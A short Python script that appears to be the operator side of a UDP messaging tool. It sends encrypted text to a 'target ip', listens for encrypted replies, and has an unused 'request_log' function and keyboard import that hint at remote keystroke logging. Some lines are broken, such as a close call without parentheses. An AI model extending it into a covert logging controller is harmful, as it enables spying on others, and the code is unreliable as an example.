from socket import *
import keyboard as keyboard
from protect import encrypt,decrypt
import threading

def listen_updates():
	host = ''
	port = 14001
	addr = (host,port)
	UDPSock = socket(AF_INET,SOCK_DGRAM)
	UDPSock.bind(addr)
	while True:
		(data,addr) = UDPSock.recvfrom(1024)
		data = decrypt(data.decode())
		print(data)
def request_log(sock,addr):
	sock.sendto(encrypt("!@#$%^&*()"),addr)


def main():
	thread = threading.Thread(target=listen_updates)
	thread.start()
	ip = input("Enter target ip addr: ")
	print("Now type whatever message you want to broadcast")
	port = 14000
	addr = (ip,port)
	UDPSock = socket(AF_INET,SOCK_DGRAM)
	UDPSock.sendto(encrypt("Has Logged in").encode(),addr)
	while True:
		data = input()
		en_data = encrypt(data)
		UDPSock.sendto(en_data.encode(),addr)
		if data == "done":
			break
	UDPSock.close


main()

